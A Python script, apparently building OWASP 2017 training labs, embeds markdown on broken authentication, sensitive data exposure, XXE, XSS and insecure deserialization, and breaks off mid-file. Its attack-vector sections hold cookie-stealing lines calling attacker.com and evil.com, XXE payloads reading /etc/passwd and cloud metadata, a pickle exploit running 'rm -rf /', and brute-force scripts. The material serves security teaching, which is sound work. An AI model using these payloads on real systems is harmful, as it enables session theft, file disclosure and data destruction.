#!/usr/bin/env python3
"""
Generate Missing OWASP Labs for Different Years and Categories

This script creates comprehensive lab environments for missing OWASP vulnerabilities
across different years (2017, 2025) with era-appropriate content and examples.

Creates:
- Web 2017 Labs (6 missing)
- Web 2025 Labs (4 missing)

Each lab includes:
- Directory structure
- Documentation files (overview.md, prevention.md, attack-vectors.md, examples.md)
- HTML conversions of documentation
- Lab subdirectory with Flask app, docker-compose.yml, etc.
"""

import os
import sys
import re
from pathlib import Path
from datetime import datetime

# HTML template for converting markdown to HTML
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <link rel="stylesheet" href="../../src/web-assets/dashboard.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .doc-container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }}
        
        .back-nav {{
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            margin-bottom: 30px;
            color: var(--primary-color);
            text-decoration: none;
            border: 1px solid var(--border-color);
            border-radius: 5px;
            transition: all 0.3s;
        }}
        
        .back-nav:hover {{
            background-color: rgba(0, 255, 65, 0.1);
            border-color: var(--primary-color);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }}
        
        .content {{
            background: var(--card-bg);
            border-radius: 8px;
            padding: 40px;
            border: 1px solid var(--border-color);
            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
        }}
        
        .content h1 {{
            color: var(--primary-color);
            font-size: 2.5rem;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--primary-color);
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }}
        
        .content h2 {{
            color: var(--secondary-color);
            font-size: 1.8rem;
            margin-top: 40px;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-color);
        }}
        
        .content h3 {{
            color: var(--primary-color);
            font-size: 1.4rem;
            margin-top: 30px;
            margin-bottom: 12px;
        }}
        
        .content h4 {{
            color: var(--secondary-color);
            font-size: 1.2rem;
            margin-top: 25px;
            margin-bottom: 10px;
        }}
        
        .content p {{
            color: var(--text-color);
            line-height: 1.8;
            margin-bottom: 15px;
        }}
        
        .content ul, .content ol {{
            margin-left: 25px;
            margin-bottom: 15px;
            color: var(--text-color);
        }}
        
        .content li {{
            margin-bottom: 10px;
            line-height: 1.6;
        }}
        
        .content code {{
            background: rgba(0, 0, 0, 0.3);
            padding: 2px 8px;
            border-radius: 4px;
            color: var(--primary-color);
            font-family: 'Courier New', monospace;
            border: 1px solid var(--border-color);
        }}
        
        .content pre {{
            background: rgba(0, 0, 0, 0.4);
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            margin: 20px 0;
            border: 1px solid var(--primary-color);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
        }}
        
        .content pre code {{
            background: none;
            padding: 0;
            border: none;
            color: var(--primary-color);
        }}
        
        .content blockquote {{
            border-left: 4px solid var(--primary-color);
            padding-left: 20px;
            margin: 20px 0;
            background: rgba(0, 255, 65, 0.05);
            padding: 15px 20px;
            border-radius: 4px;
        }}
        
        .content table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            border: 1px solid var(--border-color);
        }}
        
        .content table th {{
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2), rgba(13, 255, 146, 0.2));
            color: var(--primary-color);
            padding: 12px;
            text-align: left;
            border: 1px solid var(--border-color);
        }}
        
        .content table td {{
            padding: 12px;
            border: 1px solid var(--border-color);
            color: var(--text-color);
        }}
        
        .content table tr:hover {{
            background: rgba(0, 255, 65, 0.05);
        }}
        
        .content a {{
            color: var(--secondary-color);
            text-decoration: none;
            border-bottom: 1px solid transparent;
            transition: all 0.3s;
        }}
        
        .content a:hover {{
            color: var(--primary-color);
            border-bottom-color: var(--primary-color);
        }}
        
        .content strong {{
            color: var(--secondary-color);
            font-weight: 600;
        }}
    </style>
</head>
<body>
    <div class="doc-container">
        <a href="../../owasp-labs.html" class="back-nav">
            <i class="fas fa-arrow-left"></i> Back to Labs
        </a>
        
        <div class="content">
            {content}
        </div>
    </div>
</body>
</html>'''


def markdown_to_html(markdown_content, title):
    """Convert markdown content to HTML with styling"""
    html_content = markdown_content
    
    # Convert headers
    html_content = re.sub(r'^#### (.*?)$', r'<h4>\1</h4>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^### (.*?)$', r'<h3>\1</h3>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^## (.*?)$', r'<h2>\1</h2>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^# (.*?)$', r'<h1>\1</h1>', html_content, flags=re.MULTILINE)
    
    # Convert code blocks
    html_content = re.sub(r'```(\w+)?\n(.*?)\n```', r'<pre><code>\2</code></pre>', html_content, flags=re.DOTALL)
    
    # Convert inline code
    html_content = re.sub(r'`([^`]+)`', r'<code>\1</code>', html_content)
    
    # Convert bold
    html_content = re.sub(r'\*\*([^*]+)\*\*', r'<strong>\1</strong>', html_content)
    
    # Convert lists
    lines = html_content.split('\n')
    in_list = False
    in_ordered_list = False
    new_lines = []
    
    for line in lines:
        if line.strip().startswith('- '):
            if not in_list:
                new_lines.append('<ul>')
                in_list = True
            new_lines.append(f'<li>{line.strip()[2:]}</li>')
        elif re.match(r'^\d+\. ', line.strip()):
            if not in_ordered_list:
                new_lines.append('<ol>')
                in_ordered_list = True
            new_lines.append(f'<li>{re.sub(r"^\d+\. ", "", line.strip())}</li>')
        else:
            if in_list:
                new_lines.append('</ul>')
                in_list = False
            if in_ordered_list:
                new_lines.append('</ol>')
                in_ordered_list = False
            if line.strip() and not line.startswith('<'):
                new_lines.append(f'<p>{line}</p>')
            else:
                new_lines.append(line)
    
    if in_list:
        new_lines.append('</ul>')
    if in_ordered_list:
        new_lines.append('</ol>')
    
    html_content = '\n'.join(new_lines)
    
    return HTML_TEMPLATE.format(title=title, content=html_content)


def create_directory(path):
    """Create directory if it doesn't exist"""
    Path(path).mkdir(parents=True, exist_ok=True)
    print(f"  ✓ Created directory: {path}")


def write_file(path, content):
    """Write content to file"""
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f"  ✓ Created file: {path}")




# ============================================================================
# WEB 2017 LABS - Content Generators
# ============================================================================

def generate_broken_authentication_2017():
    """Generate Broken Authentication lab (2017)"""
    return {
        'number': '02',
        'name': 'Broken-Authentication',
        'slug': 'broken-authentication',
        'title': 'Broken Authentication',
        'port': 5020,
        'overview': '''# Broken Authentication - Overview

## What is Broken Authentication?

**Broken Authentication** occurs when application functions related to authentication and session management are implemented incorrectly, allowing attackers to compromise passwords, keys, session tokens, or exploit other implementation flaws to assume other users' identities.

### Core Vulnerabilities

Authentication breaks down in several ways:

- **Weak Password Requirements**: Allowing simple, guessable passwords
- **Credential Stuffing**: No protection against automated attacks using breached credentials
- **Session Fixation**: Reusing session IDs before and after login
- **Exposed Session IDs**: Session tokens in URLs or insecure storage
- **Missing Session Timeout**: Sessions that never expire
- **Weak Session ID Generation**: Predictable or easily guessable tokens

## Why Does This Matter?

Authentication is the gatekeeper to your application. When it fails:

- Attackers gain unauthorized access to user accounts
- Personal and financial data gets exposed
- Identity theft becomes possible
- Business operations can be disrupted

### Business Impact

- **Data Breaches**: Millions of user accounts compromised
- **Financial Loss**: Fraudulent transactions, theft
- **Regulatory Fines**: GDPR, PCI-DSS violations
- **Reputation Damage**: Loss of customer trust

## Technical Context

### Classic 2017 Vulnerabilities

In 2017, these were the most common authentication issues:

1. **Weak Password Policies**
   - No complexity requirements
   - Allowing common passwords like "password123"
   - No password rotation

2. **Session Management Flaws**
   - Session IDs in URLs: `https://example.com?sessionid=abc123`
   - Sessions not invalidated after logout
   - Concurrent sessions allowed without warning

3. **Missing Brute Force Protection**
   - Unlimited login attempts
   - No account lockout mechanisms
   - No CAPTCHA or rate limiting

4. **Insecure Credential Storage**
   - Passwords stored in plain text
   - Weak hashing algorithms (MD5, SHA1)
   - No salt in password hashes

### Real-World Examples (2017 Era)

**Yahoo (2013-2014, disclosed 2016-2017)**
- 3 billion accounts compromised
- Weak security questions
- Inadequate password hashing

**Equifax (2017)**
- 147 million records exposed
- Weak authentication on administrative portals
- Unpatched vulnerabilities

## Key Takeaways

- Authentication must be strong at every layer
- Session management requires careful implementation
- Passwords must be properly hashed and salted
- Multi-factor authentication adds critical security
- Monitor for suspicious authentication attempts
''',
        'prevention': '''# Broken Authentication - Prevention

## Secure Authentication Practices

### 1. Strong Password Policies

**Requirements:**
- Minimum 8-12 characters
- Mix of uppercase, lowercase, numbers, special characters
- Check against breached password databases (Have I Been Pwned)
- Enforce password history (prevent reuse)

**Example Implementation:**

```python
import re
from werkzeug.security import generate_password_hash, check_password_hash

def validate_password(password):
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    if not re.search(r'[A-Z]', password):
        return False, "Password must contain uppercase letter"
    if not re.search(r'[a-z]', password):
        return False, "Password must contain lowercase letter"
    if not re.search(r'[0-9]', password):
        return False, "Password must contain number"
    if not re.search(r'[!@#$%^&*]', password):
        return False, "Password must contain special character"
    return True, "Password is strong"

# Hash passwords properly
hashed = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)
```

### 2. Secure Session Management

**Best Practices:**

```python
import os
import secrets
from flask import Flask, session
from datetime import timedelta

app = Flask(__name__)
app.secret_key = os.urandom(32)  # Strong random key

# Configure secure sessions
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True  # No JavaScript access
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

# Generate secure session IDs
def create_session():
    session_id = secrets.token_urlsafe(32)
    session['id'] = session_id
    session.permanent = True

# Regenerate session ID on privilege change
def regenerate_session():
    old_session = dict(session)
    session.clear()
    session.update(old_session)
    session.modified = True
```

### 3. Implement Brute Force Protection

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic with rate limiting
    pass
```

### 4. Multi-Factor Authentication

Always offer (and encourage) MFA:

```python
import pyotp

def setup_2fa(user):
    secret = pyotp.random_base32()
    user.totp_secret = secret
    return pyotp.totp.TOTP(secret).provisioning_uri(
        user.email, 
        issuer_name="YourApp"
    )

def verify_2fa(user, token):
    totp = pyotp.TOTP(user.totp_secret)
    return totp.verify(token, valid_window=1)
```

## Security Checklist

- [ ] Use strong password hashing (bcrypt, Argon2, PBKDF2)
- [ ] Implement account lockout after failed attempts
- [ ] Use secure session management
- [ ] Enable HTTPS for all authentication flows
- [ ] Implement session timeout
- [ ] Regenerate session IDs after login
- [ ] Offer multi-factor authentication
- [ ] Monitor for suspicious login attempts
- [ ] Never expose session IDs in URLs
- [ ] Clear sessions on logout
''',
        'attack_vectors': '''# Broken Authentication - Attack Vectors

## Common Attack Methods

### 1. Credential Stuffing

Attackers use lists of breached username/password combinations:

```bash
# Example attack with curl
for cred in credentials.txt; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    curl -X POST https://target.com/login \
         -d "username=$username&password=$password"
done
```

**Impact**: Mass account compromise

### 2. Brute Force Attack

Systematically trying password combinations:

```python
import requests

usernames = ['admin', 'user', 'test']
passwords = ['password', '123456', 'admin123']

for user in usernames:
    for pwd in passwords:
        response = requests.post(
            'http://target.com/login',
            data={'username': user, 'password': pwd}
        )
        if response.status_code == 200:
            print(f"Found: {user}:{pwd}")
```

### 3. Session Hijacking

Stealing session tokens:

```javascript
// If session ID is in URL or accessible to JavaScript
document.cookie  // Steal all cookies
localStorage.getItem('session')  // Steal from storage

// Send to attacker
fetch('https://attacker.com/steal?cookie=' + document.cookie)
```

### 4. Session Fixation

Force user to use attacker's session ID:

```
1. Attacker gets session ID: SESSIONID=abc123
2. Attacker sends victim link: https://bank.com/login?SESSIONID=abc123
3. Victim logs in using that session
4. Attacker now has authenticated session
```

### 5. Password Spray Attack

Try common passwords against many accounts:

```python
common_passwords = ['Password123!', 'Welcome1', 'Company123!']
usernames = get_all_usernames()  # From OSINT

for password in common_passwords:
    for user in usernames:
        try_login(user, password)
        sleep(5)  # Avoid detection
```

## Detection and Monitoring

Watch for:
- Multiple failed login attempts
- Logins from unusual locations
- Concurrent sessions from different IPs
- Rapid successive login attempts
- Access to multiple accounts from same IP
''',
        'examples': '''# Broken Authentication - Code Examples

## Vulnerable vs Secure Code

### Example 1: Password Validation

**❌ VULNERABLE:**

```python
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']
    
    # BAD: No password requirements
    # BAD: Plain text storage
    users[username] = password
    return "Account created"
```

**✅ SECURE:**

```python
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']
    
    # Validate password strength
    if len(password) < 12:
        return "Password too short", 400
    
    # Hash password with salt
    from werkzeug.security import generate_password_hash
    hashed = generate_password_hash(password, method='pbkdf2:sha256')
    
    users[username] = hashed
    return "Account created"
```

### Example 2: Session Management

**❌ VULNERABLE:**

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if check_credentials(username, password):
        # BAD: Predictable session ID
        session['user'] = username
        session['sessionid'] = str(hash(username))
        return "Logged in"
```

**✅ SECURE:**

```python
import secrets

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if check_credentials(username, password):
        # Regenerate session to prevent fixation
        old_session = dict(session)
        session.clear()
        
        # Secure random session ID
        session['user'] = username
        session['sessionid'] = secrets.token_urlsafe(32)
        session.permanent = True
        
        return "Logged in"
```

### Example 3: Logout Handling

**❌ VULNERABLE:**

```python
@app.route('/logout')
def logout():
    # BAD: Only client-side logout
    return redirect('/login')
```

**✅ SECURE:**

```python
@app.route('/logout')
def logout():
    # Clear all session data
    session.clear()
    
    # Blacklist the session token
    blacklist_token(session.get('sessionid'))
    
    return redirect('/login')
```
'''
    }



def generate_sensitive_data_exposure_2017():
    """Generate Sensitive Data Exposure lab (2017)"""
    return {
        'number': '03',
        'name': 'Sensitive-Data-Exposure',
        'slug': 'sensitive-data-exposure',
        'title': 'Sensitive Data Exposure',
        'port': 5021,
        'overview': '''# Sensitive Data Exposure - Overview

## What is Sensitive Data Exposure?

**Sensitive Data Exposure** occurs when applications fail to adequately protect sensitive information such as financial data, healthcare records, and personal identifiable information (PII). This can happen both at rest (stored data) and in transit (transmitted data).

### Common Causes

- **Weak Encryption**: Using outdated algorithms (DES, RC4)
- **No Encryption**: Storing or transmitting data in clear text
- **Weak Key Management**: Hardcoded keys, insufficient key rotation
- **Improper Certificate Validation**: Ignoring SSL/TLS errors
- **Insecure Protocols**: Using HTTP instead of HTTPS, FTP instead of SFTP

## Why Does This Matter?

Sensitive data exposure can lead to:

- Identity theft and fraud
- Privacy violations and regulatory fines
- Loss of competitive advantage
- Reputational damage

### Classic 2017 Vulnerabilities

In the 2017 era, common issues included:

1. **HTTP instead of HTTPS**: Credentials sent in clear text
2. **Weak SSL/TLS**: Supporting SSLv3, TLS 1.0
3. **MD5/SHA1 Hashing**: Cryptographically broken algorithms
4. **Database Encryption**: No encryption at rest
5. **Backup Exposure**: Unencrypted backup files accessible

## Real-World Impact

**Heartbleed (2014, still relevant 2017)**
- OpenSSL vulnerability exposed private keys
- Millions of servers affected
- Encrypted communications compromised

**Target Breach (2013, lessons learned by 2017)**
- 40 million credit cards stolen
- Weak network segmentation
- Inadequate encryption
''',
        'prevention': '''# Sensitive Data Exposure - Prevention

## Encryption Best Practices

### 1. Data in Transit

Always use HTTPS/TLS:

```python
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# Force HTTPS
Talisman(app, 
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'"
    }
)
```

### 2. Data at Rest

Encrypt sensitive data:

```python
from cryptography.fernet import Fernet
import base64
import os

class SecureStorage:
    def __init__(self):
        # Generate or load encryption key
        key = os.environ.get('ENCRYPTION_KEY') or Fernet.generate_key()
        self.cipher = Fernet(key)
    
    def encrypt_data(self, data):
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt_data(self, encrypted_data):
        return self.cipher.decrypt(encrypted_data.encode()).decode()

# Usage
storage = SecureStorage()
encrypted = storage.encrypt_data("sensitive info")
```

### 3. Strong Password Hashing

```python
from argon2 import PasswordHasher

ph = PasswordHasher()

# Hash password
hash = ph.hash("user_password")

# Verify password
try:
    ph.verify(hash, "user_password")
    print("Password correct")
except:
    print("Password incorrect")
```

## Security Checklist

- [ ] Use TLS 1.2 or higher
- [ ] Encrypt all sensitive data at rest
- [ ] Use strong encryption algorithms (AES-256)
- [ ] Implement proper key management
- [ ] Disable weak ciphers
- [ ] Use HTTP Strict Transport Security (HSTS)
- [ ] Never log sensitive data
- [ ] Use secure random number generators
''',
        'attack_vectors': '''# Sensitive Data Exposure - Attack Vectors

## Attack Methods

### 1. Man-in-the-Middle (MITM)

Intercepting unencrypted traffic:

```bash
# Using mitmproxy to intercept HTTP traffic
mitmproxy -p 8080

# In another terminal, route traffic through proxy
export http_proxy=http://localhost:8080
curl http://insecure-site.com/login
```

### 2. SSL Strip Attack

Downgrading HTTPS to HTTP:

```python
# Attacker's proxy strips HTTPS
# Victim thinks they're on HTTPS but actually HTTP
# Attacker sees all traffic in clear text
```

### 3. Weak Crypto Detection

Finding weak encryption:

```bash
# Scan for weak SSL/TLS
nmap --script ssl-enum-ciphers -p 443 target.com

# Test for SSLv3
openssl s_client -connect target.com:443 -ssl3
```

### 4. Database Exposure

Finding exposed databases:

```bash
# Search for backup files
gobuster dir -u http://target.com -w wordlist.txt -x .sql,.bak,.db

# Common exposed files
/backup.sql
/database.bak
/data.db
/users.csv
```
''',
        'examples': '''# Sensitive Data Exposure - Examples

## Vulnerable vs Secure

### Example 1: Password Storage

**❌ VULNERABLE:**

```python
# Plain text password storage
users = {
    'alice': 'password123',
    'bob': 'admin456'
}
```

**✅ SECURE:**

```python
from werkzeug.security import generate_password_hash, check_password_hash

users = {
    'alice': generate_password_hash('password123'),
    'bob': generate_password_hash('admin456')
}

# Verify password
if check_password_hash(users['alice'], input_password):
    print("Authenticated")
```

### Example 2: Credit Card Storage

**❌ VULNERABLE:**

```python
# Storing credit card in plain text
user_data = {
    'card_number': '4532-1234-5678-9010',
    'cvv': '123'
}
```

**✅ SECURE:**

```python
from cryptography.fernet import Fernet

# Encrypt sensitive data
key = Fernet.generate_key()
cipher = Fernet(key)

encrypted_card = cipher.encrypt(b'4532-1234-5678-9010')
# Store encrypted_card, never plain text
# Use PCI-compliant tokenization in production
```
'''
    }



def generate_xxe_2017():
    """Generate XML External Entities lab (2017)"""
    return {
        'number': '04',
        'name': 'XML-External-Entities',
        'slug': 'xml-external-entities',
        'title': 'XML External Entities (XXE)',
        'port': 5022,
        'overview': '''# XML External Entities (XXE) - Overview

## What is XXE?

**XML External Entity (XXE)** attacks occur when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This can lead to disclosure of confidential data, denial of service, server-side request forgery, and other system impacts.

### How XXE Works

XML parsers can be configured to process external entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

When parsed, `&xxe;` is replaced with the contents of `/etc/passwd`.

## Why XXE Was Critical in 2017

- Many legacy systems used XML for APIs
- SOAP web services were common
- Default XML parser configurations were insecure
- XML used for Office documents, SVG, SAML

## Real-World Impact

XXE can lead to:
- Reading sensitive files
- Internal network scanning
- Denial of service
- Remote code execution (in some cases)
''',
        'prevention': '''# XXE Prevention

## Secure XML Parsing

### Python Example:

```python
import defusedxml.ElementTree as ET

# SECURE: Use defusedxml
tree = ET.parse('input.xml')

# Configure parser to disable entities
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False
)
tree = etree.parse('input.xml', parser)
```

### Disable External Entities:

```python
# For standard library xml
import xml.etree.ElementTree as ET
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges

parser = make_parser()
parser.setFeature(feature_external_ges, False)
```

## Best Practices

- Use JSON instead of XML when possible
- Disable DTD processing
- Disable external entity processing
- Use allowlists for XML schemas
- Update XML processors regularly
''',
        'attack_vectors': '''# XXE Attack Vectors

## File Disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

## SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&ssrf;</data>
```

## Billion Laughs Attack (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```
''',
        'examples': '''# XXE Examples

## Vulnerable Code

**❌ INSECURE:**

```python
import xml.etree.ElementTree as ET

@app.route('/parse', methods=['POST'])
def parse_xml():
    xml_data = request.data
    # VULNERABLE: Default parser allows XXE
    tree = ET.fromstring(xml_data)
    return tree.find('data').text
```

**✅ SECURE:**

```python
import defusedxml.ElementTree as ET

@app.route('/parse', methods=['POST'])
def parse_xml():
    xml_data = request.data
    # SECURE: defusedxml prevents XXE
    tree = ET.fromstring(xml_data)
    return tree.find('data').text
```
'''
    }


def generate_xss_2017():
    """Generate Cross-Site Scripting lab (2017)"""
    return {
        'number': '07',
        'name': 'Cross-Site-Scripting',
        'slug': 'cross-site-scripting',
        'title': 'Cross-Site Scripting (XSS)',
        'port': 5023,
        'overview': '''# Cross-Site Scripting (XSS) - Overview

## What is XSS?

**Cross-Site Scripting (XSS)** enables attackers to inject malicious scripts into web pages viewed by other users. When victims load the page, the malicious script executes in their browser, potentially stealing cookies, session tokens, or performing actions on their behalf.

### Types of XSS

1. **Reflected XSS**: Script reflected off web server (URL parameters)
2. **Stored XSS**: Script stored in database and displayed to users
3. **DOM-based XSS**: Vulnerability in client-side JavaScript

### Example Attack

```html
<!-- Vulnerable search page -->
<h1>Results for: <?php echo $_GET['q']; ?></h1>

<!-- Attack URL -->
http://site.com/search?q=<script>alert(document.cookie)</script>
```

## Why XSS Matters

XSS was #7 in OWASP Top 10 2017 and remains critical:

- Session hijacking
- Credential theft
- Malware distribution
- Website defacement
- Phishing attacks

## Classic 2017 XSS Scenarios

- Unescaped user input in HTML
- Rich text editors without sanitization
- JavaScript template injection
- JSON endpoints without Content-Type
''',
        'prevention': '''# XSS Prevention

## Output Encoding

```python
from flask import Flask, escape, Markup
from markupsafe import escape

@app.route('/profile/<username>')
def profile(username):
    # Auto-escapes in templates
    return render_template('profile.html', name=username)
```

```html
<!-- Template with auto-escaping -->
<h1>Welcome {{ name }}</h1>  <!-- Escaped by default -->
<div>{{ content|safe }}</div>  <!-- Only if trusted -->
```

## Content Security Policy

```python
from flask import Flask, make_response

@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response
```

## Input Validation

```python
import bleach

allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a']
allowed_attrs = {'a': ['href', 'title']}

def sanitize_input(user_input):
    return bleach.clean(user_input, 
                       tags=allowed_tags,
                       attributes=allowed_attrs,
                       strip=True)
```

## Best Practices

- Escape all user input before rendering
- Use Content Security Policy headers
- Validate and sanitize input
- Use HttpOnly and Secure flags on cookies
- Avoid inline JavaScript
''',
        'attack_vectors': '''# XSS Attack Vectors

## Reflected XSS

```html
<!-- URL: /search?q=<script>alert('XSS')</script> -->
<div>Results: <script>alert('XSS')</script></div>
```

## Stored XSS

```javascript
// Attacker posts comment
POST /api/comments
{
  "text": "<script>fetch('//evil.com?c='+document.cookie)</script>"
}

// Stored in database, executed for all viewers
```

## DOM-based XSS

```javascript
// Vulnerable JavaScript
document.getElementById('welcome').innerHTML = 
    "Hello " + location.hash.substring(1);

// Attack URL: site.com#<img src=x onerror=alert('XSS')>
```

## Event Handler XSS

```html
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
```
''',
        'examples': '''# XSS Code Examples

## Vulnerable vs Secure

**❌ VULNERABLE:**

```python
@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form['comment']
    # Stored in DB without sanitization
    db.insert({'comment': comment})
    
    # Displayed without escaping
    return f"<div>{comment}</div>"
```

**✅ SECURE:**

```python
from markupsafe import escape
import bleach

@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form['comment']
    
    # Sanitize input
    clean_comment = bleach.clean(comment)
    db.insert({'comment': clean_comment})
    
    # Escape output
    return render_template('comment.html', 
                         comment=clean_comment)
```
'''
    }


def generate_insecure_deserialization_2017():
    """Generate Insecure Deserialization lab (2017)"""
    return {
        'number': '08',
        'name': 'Insecure-Deserialization',
        'slug': 'insecure-deserialization',
        'title': 'Insecure Deserialization',
        'port': 5024,
        'overview': '''# Insecure Deserialization - Overview

## What is Insecure Deserialization?

**Insecure Deserialization** occurs when untrusted data is used to recreate objects in an application. This can lead to remote code execution, replay attacks, injection attacks, and privilege escalation.

### The Problem

Serialization converts objects to bytes for storage/transmission. Deserialization reconstructs the object. If attackers control serialized data, they can:

- Execute arbitrary code
- Modify application logic
- Bypass authentication
- Perform privilege escalation

### Common in 2017

Popular serialization formats:
- Python pickle
- PHP serialize()
- Java serialization
- .NET BinaryFormatter

## Why This Matters

In 2017, this was #8 in OWASP Top 10 due to:

- Many frameworks used insecure deserialization
- Java deserialization attacks were prevalent
- Session cookies often used serialization
- API data often serialized without validation

## Real-World Impact

**Apache Commons Collections (2015, widespread in 2017)**
- Remote code execution via Java deserialization
- Affected major applications

**Ruby on Rails (2013, lessons still relevant 2017)**
- Remote code execution via YAML deserialization
- Led to major security updates
''',
        'prevention': '''# Insecure Deserialization - Prevention

## Safe Alternatives

```python
import json

# SECURE: Use JSON instead of pickle
data = {'user': 'alice', 'role': 'admin'}
serialized = json.dumps(data)
deserialized = json.loads(serialized)
```

## Integrity Checks

```python
import hmac
import hashlib
import json
from base64 import b64encode, b64decode

SECRET_KEY = 'your-secret-key'

def sign_data(data):
    json_data = json.dumps(data)
    signature = hmac.new(
        SECRET_KEY.encode(),
        json_data.encode(),
        hashlib.sha256
    ).hexdigest()
    return b64encode(json_data.encode()).decode() + '.' + signature

def verify_data(signed_data):
    try:
        encoded_data, signature = signed_data.split('.')
        json_data = b64decode(encoded_data).decode()
        
        expected_sig = hmac.new(
            SECRET_KEY.encode(),
            json_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        if hmac.compare_digest(signature, expected_sig):
            return json.loads(json_data)
    except:
        pass
    return None
```

## Best Practices

- Avoid deserializing untrusted data
- Use JSON instead of binary serialization
- Implement digital signatures
- Use type constraints
- Monitor deserialization activity
- Run deserialization in sandboxed environments
''',
        'attack_vectors': '''# Insecure Deserialization - Attack Vectors

## Python Pickle Attack

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

# Attacker creates malicious pickle
malicious_data = pickle.dumps(Exploit())

# Victim deserializes - BOOM!
pickle.loads(malicious_data)  # Executes rm -rf /
```

## Session Cookie Manipulation

```python
# Application serializes user object to cookie
cookie_data = serialize(user_object)

# Attacker modifies serialized data
# Changes role from 'user' to 'admin'
# Server deserializes without validation
# Attacker gains admin access
```
''',
        'examples': '''# Insecure Deserialization - Examples

**❌ VULNERABLE:**

```python
import pickle

@app.route('/session', methods=['POST'])
def load_session():
    session_data = request.cookies.get('session')
    # DANGEROUS: Deserializing untrusted data
    user = pickle.loads(b64decode(session_data))
    return f"Welcome {user.name}"
```

**✅ SECURE:**

```python
import json
from itsdangerous import URLSafeSerializer

serializer = URLSafeSerializer('secret-key')

@app.route('/session', methods=['POST'])
def load_session():
    session_data = request.cookies.get('session')
    # SECURE: Signed serialization
    try:
        user_data = serializer.loads(session_data)
        return f"Welcome {user_data['name']}"
    except:
        return "Invalid session", 401
```
'''
    }


def generate_insufficient_logging_2017():
    """Generate Insufficient Logging & Monitoring lab (2017)"""
    return {
        'number': '10',
        'name': 'Insufficient-Logging-Monitoring',
        'slug': 'insufficient-logging-monitoring',
        'title': 'Insufficient Logging & Monitoring',
        'port': 5025,
        'overview': '''# Insufficient Logging & Monitoring - Overview

## What is the Problem?

**Insufficient logging and monitoring** allows attackers to:
- Achieve their goals without being detected
- Maintain persistence
- Tamper with or destroy evidence
- Attack additional systems

Without adequate logging and monitoring:
- Breaches go undetected for months
- Incident response is severely hampered
- Attack patterns cannot be identified

## Why This Matters

In 2017, this was #10 in OWASP Top 10:

- Average breach detection time: 197 days
- Many breaches discovered by external parties
- Insufficient audit trails hindered investigations
- Regulatory requirements (PCI-DSS, GDPR) demand logging

## What Should Be Logged?

Critical events to log:
- Login attempts (successful and failed)
- Access control failures
- Input validation failures
- Authentication failures
- Session management events
- Application errors and exceptions
- System events (startup, shutdown)

## Real-World Impact

**Equifax (2017)**
- Breach went undetected for 76 days
